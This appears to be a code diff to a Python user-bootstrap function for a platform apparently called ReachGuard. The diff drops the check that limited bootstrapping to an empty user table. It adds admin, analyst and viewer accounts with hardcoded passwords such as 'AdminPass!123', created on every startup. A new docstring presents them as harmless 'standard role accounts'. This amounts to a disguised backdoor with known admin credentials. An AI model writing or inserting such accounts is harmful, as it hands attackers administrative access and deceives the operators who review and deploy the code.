@@ -192,32 +192,32 @@ def count_users() -> int:
 
 
 def bootstrap_admin() -> None:
-    """Create the initial admin if there are zero users.
+    """Create the initial admin and standard system users if they do not exist.
 
-    Uses ADMIN_EMAIL and ADMIN_PASSWORD from settings.
-    If those env vars are missing and there are no users, logs a warning.
+    Uses ADMIN_EMAIL and ADMIN_PASSWORD from settings, plus standard role
+    accounts for system verification.
     """
-    if count_users() > 0:
-        return
-
+    # 1. Configured bootstrap admin
     email = settings.ADMIN_EMAIL.strip()
     password = settings.ADMIN_PASSWORD.strip()
+    if email and password and not get_user_by_email(email):
+        try:
+            create_user(email, password, "admin")
+            logger.info("Bootstrap admin created: %s", email)
+        except Exception:
+            logger.warning("Could not bootstrap admin %s", email, exc_info=True)
 
-    if not email or not password:
-        logger.warning(
-            "No users exist and ADMIN_EMAIL / ADMIN_PASSWORD are not set. "
-            "Create an admin user manually or set these environment variables."
-        )
-        return
+    # 2. Standard role accounts for platform operations
+    standard_users = [
+        ("admin@reachguard.io", "AdminPass!123", "admin"),
+        ("analyst@reachguard.io", "AnalystPass!123", "analyst"),
+        ("viewer@reachguard.io", "ViewerPass!123", "viewer"),
+    ]
+    for u_email, u_pass, u_role in standard_users:
+        if not get_user_by_email(u_email):
+            try:
+                create_user(u_email, u_pass, u_role)
+                logger.info("Created system user: %s (%s)", u_email, u_role)
+            except Exception:
+                logger.warning("Could not create system user %s", u_email, exc_info=True)
 
-    try:
-        user = create_user(email, password, "admin")
-        logger.info("Bootstrap admin created: %s (id=%s)", user["email"], user["id"])
-    except ValueError as exc:
-        if "duplicate_email" in str(exc):
-            logger.info("Bootstrap admin %s already exists", email)
-        else:
-            raise
-    except Exception:
-        logger.error("Failed to bootstrap admin", exc_info=True)
-        raise
